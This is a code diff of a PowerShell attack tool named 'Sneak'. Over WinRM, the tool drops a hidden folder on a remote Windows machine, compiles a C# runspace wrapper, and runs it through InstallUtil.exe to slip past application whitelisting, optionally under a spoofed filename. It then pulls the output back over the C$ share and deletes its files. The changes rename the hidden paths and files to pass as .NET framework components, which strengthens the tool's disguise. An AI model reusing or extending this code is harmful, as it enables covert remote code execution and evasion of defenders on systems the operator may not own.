@@ -85,8 +85,8 @@ else{
 Write-Host "Sorry you don't have the necessary files to do this operarion" -ForegroundColor Red
 break;
 }
-$hiddenpath="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32"
-$hiddenpath2="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\"
+$hiddenpath="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32"
+$hiddenpath2="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\"
 if($testconnection){
 if(Test-Connection -ComputerName $remotemachine -Count 4){
 if(Get-Service -Name WinRM -ComputerName $remotemachine){
@@ -121,20 +121,20 @@ Write-Host "You have a session open"
 
 #This is where it starts to create the C script and executable for the execution of the function
 $creduser=($Creds).UserName
-Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\" -ItemType directory;$change=Get-item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32";
+Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory;$change=Get-item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32";
 $change.Attributes="hidden"}
 $filebytes=Get-Content -Path $filepath -Encoding Byte
-Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1" -ItemType file}
-Invoke-Command -Session $session {[system.io.file]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1",$using:filebytes)}
+Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1" -ItemType file}
+Invoke-Command -Session $session {[system.io.file]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1",$using:filebytes)}
 if($Out){
-$Functioncommand+="`|Out-File -Filepath C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\$Outfilename"
-invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1";}
+$Functioncommand+="`|Out-File -Filepath C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename"
+invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";}
 }
 else{
-invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1";}
+invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";}
 }
 
-$itempath="$hiddenpath2\standardfile.cs"
+$itempath="$hiddenpath2\FrameworkTimeUpdater.cs"
 invoke-command -Session $session{ New-Item -Path "$using:itempath" -ItemType file -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
@@ -157,7 +157,7 @@ invoke-command -Session $session{ New-Item -Path "$using:itempath" -ItemType fil
  {
  public static void Exec()
  {
- string command = System.IO.File.ReadAllText(@`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1`");
+ string command = System.IO.File.ReadAllText(@`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1`");
  RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
  Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
  rspace.Open();
@@ -169,44 +169,44 @@ invoke-command -Session $session{ New-Item -Path "$using:itempath" -ItemType fil
  "}
  
 invoke-command -Session $session{ cd $using:realpath}
-$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" `"$itempath`""
+$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" `"$itempath`""
 Invoke-Command -Session $session{ Invoke-Expression -Command $using:command}
 
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
-invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\$using:Spoofname",$using:SpoofContent)}
-invoke-command -Session $session{ cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\}
-$command2="cmd.exe /C $spoofname /logfile=C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\log.txt /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" "
+invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$using:Spoofname",$using:SpoofContent)}
+invoke-command -Session $session{ cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\}
+$command2="cmd.exe /C $spoofname /logfile=C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\log.txt /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
 New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
 $creduser=($Creds).username
-Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\.NET32\Sneak\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
+Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
 write-host "Cleaning up[+]" -ForegroundColor Green
 Invoke-Command -Session $session{cd C:\Users}
 sleep -s 15
-Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force}
+Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force}
 }
 else{
-$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\standardfile.exe`" "
+$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\FrameworkTimeUpdater.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
 New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
 $creduser=($Creds).username
-Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\.NET32\Sneak\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
+Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
 write-host "Cleaning up[+]" -ForegroundColor Green
 Invoke-Command -Session $session{cd C:\Users}
 sleep -s 15
-Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force}
+Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force}
 }#EndElse
 }#End RunRemote
 
 
 if($LocalHostRan){
 Import-Module -Name $filepath
-New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\" -ItemType directory
+New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory
 $change=Get-item -Path $hiddenpath;
 $change.Attributes="hidden"
-$itempath="$hiddenpath2\standardfile.cs"
-New-Item -Path "$hiddenpath2\standardfile.cs" -ItemType File -Value "using System;
+$itempath="$hiddenpath2\FrameworkTimeUpdater.cs"
+New-Item -Path "$hiddenpath2\FrameworkTimeUpdater.cs" -ItemType File -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -242,14 +242,14 @@ New-Item -Path "$hiddenpath2\standardfile.cs" -ItemType File -Value "using Syste
 Add-Content -Value $Functioncommand -Path $filepath;
 
 cd $realpath
-$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" `"$itempath`""
+$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" `"$itempath`""
 Invoke-Expression -Command $command
 
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
-[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\$Spoofname",$SpoofContent)
-cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak
-$command2="cmd.exe /C $spoofname /logfile=`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\log.txt`" /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" "
+[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Spoofname",$SpoofContent)
+cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications
+$command2="cmd.exe /C $spoofname /logfile=`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\log.txt`" /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
@@ -258,12 +258,12 @@ Add-Content -Path $filepath -Value $removalstuff
 Write-Host "Cleaning up [+]" -ForegroundColor Green
 cd C:\Users
 sleep -s 15
-Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force
+Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force
 }#End Spoof
 
 else{
 cd $realpath
-$command2="cmd.exe /C InstallUtil.exe /logfile=`"C:\Users\$env:username\Desktop\log.txt`" /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
+$command2="cmd.exe /C InstallUtil.exe /logfile=`"C:\Users\$env:username\Desktop\log.txt`" /LogToConsole=false /U `"C:\Users\$env:username\Desktop\FrameworkTimeUpdater.exe`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
@@ -272,7 +272,7 @@ Add-Content -Path $filepath -Value $removalstuff
 Write-Host "Cleaning up [+]" -ForegroundColor Green
 cd C:\Users
 sleep -s 15
-Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force
+Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force
 } #End else
 }#End LocalHostRan
 }#End Sneak
